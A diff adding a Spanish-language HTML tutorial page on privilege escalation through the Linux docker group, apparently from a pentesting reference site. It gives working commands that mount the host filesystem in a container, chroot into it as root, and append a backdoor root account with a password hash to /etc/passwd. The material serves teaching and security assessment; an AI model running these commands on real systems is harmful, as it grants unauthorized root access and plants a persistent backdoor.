@@ -1,0 +1,24 @@
+<h1>Grupo Docker</h1>
+
+<h2><i class="bi bi-check-circle me-2"></i></i>Explicación</h2>
+<p class="mainText">
+    El grupo <b>docker</b> controla el acceso y la gestión de contenedores Docker en el sistema. Esto puede representar un riesgo potencial 
+    para la escalada de privilegios, ya que permite a un posible atacante acceder a los propios contenedores y su información, e incluso 
+    montar volúmenes del host principal en Docker con todos los permisos.
+</p>
+
+<h2><i class="bi bi-check-circle me-2"></i></i>Ataque</h2>
+<p class="mainText">
+    Un atacante podría montar el sistema de archivos del host original dentro de una instancia de Docker, de tal manera que dentro de la instancia 
+    se podría modificar todo el sistema de archivos como root.
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">#Listar imágenes de docker
+docker image
+#Shell en docker con el sistema de ficheros host montado
+docker run -it --rm -v /:/mnt [imagename] chroot /mnt bash
+#Añadir nuevo root
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd
+</code></pre>
+</div>
